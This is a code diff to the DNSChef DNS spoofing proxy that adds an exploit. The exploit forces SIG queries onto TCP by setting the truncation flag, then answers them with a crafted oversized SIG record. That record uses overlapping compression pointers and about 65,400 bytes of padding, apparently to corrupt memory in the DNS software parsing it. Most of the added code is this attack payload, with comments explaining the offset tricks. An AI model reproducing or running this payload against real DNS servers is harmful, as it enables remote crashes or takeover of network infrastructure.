@@ -51,7 +51,38 @@ import os
 import binascii
 import string
 import base64
+import struct
 
+class SIG(RD):
+    covered = H('covered')
+    algorithm = B('algorithm')
+    labels = B('labels')
+    orig_ttl = I('orig_ttl')
+    sig_exp = I('sig_exp')
+    sig_inc = I('sig_inc')
+    key_tag = b''
+
+    def __init__(self,covered,algorithm,labels,orig_ttl,
+                      sig_exp,sig_inc,key_tag,name,sig):
+        self.covered = covered
+        self.algorithm = algorithm
+        self.labels = labels
+        self.orig_ttl = orig_ttl
+        self.sig_exp = sig_exp
+        self.sig_inc = sig_inc
+        self.key_tag = key_tag
+        self.name = name
+        self.sig = sig
+
+    def pack(self,buffer):
+        buffer.pack("!HBBIII",self.covered,self.algorithm,self.labels,
+                               self.orig_ttl,self.sig_exp,self.sig_inc)
+        buffer.append(self.key_tag)
+        buffer.append(self.name)
+        buffer.append(self.sig)
+
+    attrs = ('covered','algorithm','labels','orig_ttl','sig_exp','sig_inc',
+             'key_tag','name','sig')
 
 class DNSChefFormatter(logging.Formatter):
 
@@ -117,14 +148,14 @@ class DNSHandler():
                     fake_records[record] = self.findnametodns(qname, self.server.nametodns[record])
 
                 # Check if there is a fake record for the current request qtype
-                if qtype in fake_records and fake_records[qtype]:
+                if (qtype in fake_records and fake_records[qtype]) or qtype == "SIG":
 
-                    fake_record = fake_records[qtype]
+                    if qtype != "SIG":
+                        fake_record = fake_records.get(qtype)
+                        log.info(f"{self.client_address[0]}: cooking the response of type '{qtype}' for {qname} to {fake_record}")
 
                     # Create a custom response to the query
-                    response = DNSRecord(DNSHeader(id=d.header.id, bitmap=d.header.bitmap, qr=1, aa=1, ra=1), q=d.q)
-
-                    log.info(f"{self.client_address[0]}: cooking the response of type '{qtype}' for {qname} to {fake_record}")
+                    response = DNSRecord(DNSHeader(id=d.header.id, bitmap=d.header.bitmap, qr=1, aa=1, ra=1), q=d.q)                    
 
                     # IPv6 needs additional work before inclusion:
                     if qtype == "AAAA":
@@ -182,6 +213,27 @@ class DNSHandler():
                         sig = base64.b64decode(("".join(sig)).encode('ascii'))
 
                         response.add_answer(RR(qname, getattr(QTYPE,qtype), rdata=RDMAP[qtype](covered, algorithm, labels,orig_ttl, sig_exp, sig_inc, key_tag, name, sig) ))
+                    
+                    elif qtype == "SIG":
+                        if self.server.socket_type == socket.SOCK_DGRAM:
+                            log.info(f'Got UDP SIG request from {self.client_address[0]}. Setting tc flag..')
+                            response = DNSRecord(DNSHeader(id=d.header.id, bitmap=d.header.bitmap, qr=1, aa=1, ra=1, tc=1), q=d.q)
+                        else:
+                            log.info(f'Got TCP SIG request from {self.client_address[0]}. Sending payload..')
+                            covered = QTYPE.A
+                            algorithm = 1
+                            labels = 3
+                            orig_ttl = 1
+                            name = b'\xc0'                              # magic "pointer" byte
+                            name += struct.pack('B', len(qname) + 47)   # add offset to the key tag (remember trailing '.')
+                            key_tag = b'\x01\x3f'                       # Use the key tag as an overlapping pointer to our sig buffer
+                            sig = 'A' * 61                              # 61 == (0x3f - len('\x01\x3f'))
+                            sig += '\x00'                               # terminate the "name" string
+                            sig += 'B' * 65400
+                            sig_exp = int(time.mktime(time.strptime('20200101000000' +'GMT',"%Y%m%d%H%M%S%Z")))
+                            sig_inc = int(time.mktime(time.strptime('20030101000000' +'GMT',"%Y%m%d%H%M%S%Z")))
+                            response.add_answer(RR(qname, QTYPE.SIG, rdata=SIG(covered, algorithm, labels, orig_ttl, sig_exp, sig_inc, key_tag, name, sig.encode('utf8'))))
+
 
                     else:
                         # dnslib doesn't like trailing dots
@@ -372,7 +424,7 @@ class TCPHandler(DNSHandler, socketserver.BaseRequestHandler):
         if response:
             # Calculate and add the additional "length" parameter
             # used in TCP DNS protocol 
-            length = binascii.unhexlify("%04x" % len(response))
+            length = struct.pack('>H', len(response))
             self.request.sendall(length + response)
 
 class ThreadedUDPServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
@@ -414,25 +466,27 @@ def start_cooking(interface, nametodns, nameservers, tcp=False, ipv6=False, port
 
             log.info("DNSChef is active.")
 
-        if tcp:
-            log.info("DNSChef is running in TCP mode")
-            server = ThreadedTCPServer((interface, int(port)), TCPHandler, nametodns, nameservers, ipv6, log)
-        else:
-            server = ThreadedUDPServer((interface, int(port)), UDPHandler, nametodns, nameservers, ipv6, log)
+        log.info("DNSChef is running in dual TCP/UDP mode")
+        tcp_server = ThreadedTCPServer((interface, int(port)), TCPHandler, nametodns, nameservers, ipv6, log)
+        udp_server = ThreadedUDPServer((interface, int(port)), UDPHandler, nametodns, nameservers, ipv6, log)
 
         # Start a thread with the server -- that thread will then start
         # more threads for each request
-        server_thread = threading.Thread(target=server.serve_forever)
+        tcp_server_thread = threading.Thread(target=tcp_server.serve_forever)
+        udp_server_thread = threading.Thread(target=udp_server.serve_forever)
 
         # Exit the server thread when the main thread terminates
-        server_thread.daemon = True
-        server_thread.start()
+        tcp_server_thread.daemon = True
+        udp_server_thread.daemon = True
+        tcp_server_thread.start()
+        udp_server_thread.start()
 
         # Loop in the main thread
         while True: time.sleep(100)
 
     except (KeyboardInterrupt, SystemExit):
-        server.shutdown()
+        tcp_server.shutdown()
+        udp_server.shutdown()
         log.info("DNSChef is shutting down.")
         sys.exit()
 
@@ -469,7 +523,6 @@ if __name__ == "__main__":
     rungroup.add_argument("--logfile", metavar="FILE", help="Specify a log file to record all activity")
     rungroup.add_argument("--nameservers", metavar="8.8.8.8#53 or 4.2.2.1#53#tcp or 2001:4860:4860::8888", default='8.8.8.8', help='A comma separated list of alternative DNS servers to use with proxied requests. Nameservers can have either IP or IP#PORT format. A randomly selected server from the list will be used for proxy requests when provided with multiple servers. By default, the tool uses Google\'s public DNS server 8.8.8.8 when running in IPv4 mode and 2001:4860:4860::8888 when running in IPv6 mode.')
     rungroup.add_argument("-i","--interface", metavar="127.0.0.1 or ::1", default="127.0.0.1", help='Define an interface to use for the DNS listener. By default, the tool uses 127.0.0.1 for IPv4 mode and ::1 for IPv6 mode.')
-    rungroup.add_argument("-t","--tcp", action="store_true", default=False, help="Use TCP DNS proxy instead of the default UDP.")
     rungroup.add_argument("-6","--ipv6", action="store_true", default=False, help="Run in IPv6 mode.")
     rungroup.add_argument("-p","--port", metavar="53", default="53", help='Port number to listen for DNS requests.')
     rungroup.add_argument("-q", "--quiet", action="store_false", dest="verbose", default=True, help="Don't show headers.")
@@ -625,4 +678,4 @@ if __name__ == "__main__":
         log.info("No parameters were specified. Running in full proxy mode")
 
     # Launch DNSChef
-    start_cooking(interface=options.interface, nametodns=nametodns, nameservers=nameservers, tcp=options.tcp, ipv6=options.ipv6, port=options.port, logfile=options.logfile)
+    start_cooking(interface=options.interface, nametodns=nametodns, nameservers=nameservers, ipv6=options.ipv6, port=options.port, logfile=options.logfile)
